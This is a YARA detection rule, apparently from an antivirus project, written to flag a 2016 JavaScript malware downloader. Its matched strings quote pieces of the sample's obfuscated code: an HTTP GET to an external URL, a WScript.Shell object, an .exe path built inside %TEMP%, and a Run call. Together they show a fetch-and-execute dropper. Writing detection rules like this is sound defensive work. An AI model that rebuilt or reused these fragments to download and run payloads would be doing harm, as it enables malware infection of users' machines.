rule sig_20160330_dbd606d6e229cab6f25df95a375d35c8 {
  meta:
    description = "datamaliciousorder - file 20160330_dbd606d6e229cab6f25df95a375d35c8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5788ca5e57cdc667f87ae06e5f5679debfb4e4b8f603caf49f3c705b79c563b9"

  strings:
    $s1  = "_I0[_LM](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "var _AQ = function _VI() {return WScript[_N](\"WScript\"+\".Shell\");}(), _TX = 11;" fullword ascii
    $s3  = "function _VE(_Y0, _V){_O = _O * 1; return _Y0 - _V;};" fullword ascii
    $s4  = "if (_I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _S(){return _UG + \"\";};" fullword ascii
    $s6  = "function _TA() {return _AQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Sm8Pv4gZTzTKXY.ex\" + \"e\";};" fullword ascii
    $s7  = "function _GB(_M){_AQ[\"Run\"](_M, _O, _O);};" fullword ascii
    $s8  = "function _LY() {return ((_XZ == true) && (_XZ == _FV)) ? 1 : _O;};" fullword ascii
    $s9  = "var _E = new this[\"Date\"]();" fullword ascii
    $s10 = "function _P()" fullword ascii
    $s11 = "function _TQ(){return _N;};" fullword ascii
    $s12 = " while (_T){" fullword ascii
    $s13 = "return _VE(_E0, _I);" fullword ascii
    $s14 = "function _WR(){return 22;};" fullword ascii
    $s15 = "function _PU(_O0) {var _U0 = (1, 2, 3, 4, 5, _O0); return _U0;};" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "var _FV = false;" fullword ascii
    $s18 = "_FV = true; " fullword ascii
    $s19 = "var _XZ = false;" fullword ascii
    $s20 = "_XZ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}